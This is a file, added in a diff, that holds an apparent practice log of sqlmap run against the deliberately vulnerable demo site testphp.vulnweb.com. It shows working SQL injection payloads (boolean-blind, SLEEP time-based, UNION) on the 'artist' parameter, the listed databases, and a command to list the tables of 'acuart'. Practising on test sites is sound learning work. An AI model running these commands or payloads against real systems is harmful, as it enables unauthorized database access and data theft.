@@ -1,0 +1,100 @@
+"""sqlmap -u testphp.vulnweb.com/artists.php?artist=1 -D acuart --tables"""
+
+
+Bilals-MacBook-Air:~ bilalkhanniazi$ sqlmap -u testphp.vulnweb.com/artists.php?artist=1 --dbs
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.7#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 00:35:26 /2022-06-06/
+
+[00:35:27] [INFO] testing connection to the target URL
+[00:35:28] [INFO] checking if the target is protected by some kind of WAF/IPS
+[00:35:29] [INFO] testing if the target URL content is stable
+[00:35:29] [INFO] target URL content is stable
+[00:35:29] [INFO] testing if GET parameter 'artist' is dynamic
+[00:35:30] [INFO] GET parameter 'artist' appears to be dynamic
+[00:35:35] [INFO] heuristic (basic) test shows that GET parameter 'artist' might be injectable (possible DBMS: 'MySQL')
+[00:35:36] [INFO] testing for SQL injection on GET parameter 'artist'
+
+
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[00:36:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[00:36:17] [INFO] GET parameter 'artist' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="sem")
+[00:36:17] [INFO] testing 'Generic inline queries'
+[00:36:18] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[00:36:18] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[00:36:19] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[00:36:19] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[00:36:19] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[00:36:20] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[00:36:20] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[00:36:21] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[00:36:23] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[00:36:23] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[00:36:24] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[00:36:24] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[00:36:25] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[00:36:26] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[00:36:27] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[00:36:27] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[00:36:27] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
+[00:36:28] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[00:36:28] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+[00:36:29] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
+[00:36:30] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
+[00:36:30] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
+[00:36:31] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[00:36:31] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
+[00:36:31] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[00:36:32] [INFO] testing 'MySQL inline queries'
+[00:36:32] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[00:36:32] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
+[00:36:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[00:36:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[00:36:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[00:36:34] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[00:36:34] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[00:36:35] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[00:36:40] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
+[00:36:45] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
+[00:36:51] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
+[00:37:14] [INFO] GET parameter 'artist' appears to be 'MySQL >= 5.0.12 OR time-based blind (SLEEP)' injectable 
+[00:37:14] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[00:37:14] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[00:37:15] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[00:37:19] [INFO] target URL appears to have 3 columns in query
+[00:37:22] [INFO] GET parameter 'artist' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'artist' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artist=1 AND 9555=9555
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP)
+    Payload: artist=1 OR SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-5608 UNION ALL SELECT CONCAT(0x7170716a71,0x5951585376754b5159786d785a5772686679746a54726e635651566a4a6e586e695743434775644c,0x716a787071),NULL,NULL-- -
+---
+[00:38:04] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0.12
+[00:38:07] [INFO] fetching database names
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+[00:38:08] [INFO] fetched data logged to text files under '/Users/bilalkhanniazi/.local/share/sqlmap/output/testphp.vulnweb.com'
+
+[*] ending @ 00:38:08 /2022-06-06/
